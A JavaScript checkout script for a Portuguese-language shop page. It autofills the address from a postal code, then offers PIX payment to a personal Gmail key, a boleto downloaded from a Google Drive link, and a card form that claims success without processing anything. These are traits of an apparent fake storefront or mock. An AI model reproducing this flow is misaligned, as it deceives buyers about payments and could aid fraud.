document.addEventListener('DOMContentLoaded', () => {
    const cepInput = document.getElementById('cep');
    const fillAddressBtn = document.getElementById('fill-address-btn');
    const logradouroInput = document.getElementById('logradouro');
    const bairroInput = document.getElementById('bairro');
    const cidadeInput = document.getElementById('cidade');
    const ufInput = document.getElementById('uf');
    const numeroInput = document.getElementById('numero');
    const complementoInput = document.getElementById('complemento');
    const nextBtn = document.getElementById('next-btn');
    const paymentForm = document.getElementById('payment-form');
    const creditCardForm = document.getElementById('credit-card-form');
    const pixBtn = document.getElementById('pix-btn');
    const cardBtn = document.getElementById('card-btn');
    const boletoBtn = document.getElementById('boleto-btn');
    const popup = document.getElementById('popup');
    const popupMessage = document.getElementById('popup-message');
    const closePopup = document.getElementById('close-popup');
    const restartLink = document.getElementById('restart-link');

    async function fetchAddress(cep) {
        try {
            const response = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
            const data = await response.json();

            if (data.erro) {
                alert('CEP não encontrado.');
                return;
            }

            logradouroInput.value = data.logradouro;
            bairroInput.value = data.bairro;
            cidadeInput.value = data.localidade;
            ufInput.value = data.uf;

            logradouroInput.disabled = false;
            bairroInput.disabled = false;
            cidadeInput.disabled = false;
            ufInput.disabled = false;
        } catch (error) {
            console.error('Erro ao buscar CEP:', error);
        }
    }

    fillAddressBtn.addEventListener('click', () => {
        const cep = cepInput.value.replace(/\D/g, '');

        if (cep.length === 8) {
            fetchAddress(cep);
        } else {
            alert('CEP inválido.');
        }
    });

    function checkFormCompletion() {
        const fields = [logradouroInput, bairroInput, cidadeInput, ufInput, numeroInput];
        return fields.every(field => field.value.trim() !== '');
    }

    nextBtn.addEventListener('click', () => {
        if (checkFormCompletion()) {
            document.getElementById('address-form').classList.add('hidden');
            paymentForm.classList.remove('hidden');
        } else {
            alert('Por favor, preencha todos os campos obrigatórios.');
        }
    });

    document.querySelectorAll('#address-form input').forEach(input => {
        input.addEventListener('input', () => {
            nextBtn.disabled = !checkFormCompletion();
        });
    });

    pixBtn.addEventListener('click', () => {
        showPopup('Use este PIX abaixo: jonathan.mega2@gmail.com');
    });

    cardBtn.addEventListener('click', () => {
        paymentForm.classList.add('hidden');
        creditCardForm.classList.remove('hidden');
    });

    boletoBtn.addEventListener('click', () => {
        window.open('https://drive.usercontent.google.com/download?id=1-Y49OzsGN6NR1E8JJliXdOH1ju0PCMmy&export=download&authuser=0', '_blank');
        showPopup('Download do boleto iniciado.');
    });

    document.getElementById('submit-card').addEventListener('click', () => {
        const cardName = document.getElementById('card-name').value;
        const cardNumber = document.getElementById('card-number').value;
        const cardCode = document.getElementById('card-code').value;
        const cardExpiry = document.getElementById('card-expiry').value;

        if (cardName && cardNumber && cardCode && cardExpiry) {
            showPopup('Pagamento com cartão de crédito realizado.');
        } else {
            alert('Todos os campos do cartão de crédito são obrigatórios.');
        }
    });

    function showPopup(message) {
        popupMessage.textContent = message;
        popup.classList.remove('hidden');
        closePopup.textContent = 'Finalizar Compra'; 
    }

    closePopup.addEventListener('click', () => {
        window.location.href = 'index.html'; 
    });
});
